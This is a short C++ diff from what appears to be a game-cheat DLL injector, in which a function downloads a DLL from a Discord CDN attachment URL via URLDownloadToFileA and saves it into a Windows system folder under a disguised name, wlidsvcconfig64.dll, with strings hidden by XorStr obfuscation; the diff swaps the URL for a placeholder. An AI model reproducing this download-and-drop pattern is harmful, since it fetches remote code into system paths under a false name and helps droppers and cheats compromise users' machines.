@@ -55,7 +55,7 @@ void InjecttoGame(bool showid)
 void win64dll()
 {
 	Inject::Cidia = XorStr("C:\\Windows\\IdentityCRL\\INT\\wlidsvcconfig64.dll").c_str();
-	std::string dwnld_URL = XorStr("https://cdn.discordapp.com/attachments/937367947633127526/937781117166186546/Cidia.dll").c_str();
+	std::string dwnld_URL = XorStr("File name").c_str();
 	std::string savepath = XorStr("C:\\Windows\\IdentityCRL\\INT\\wlidsvcconfig64.dll").c_str();
 	URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
 }
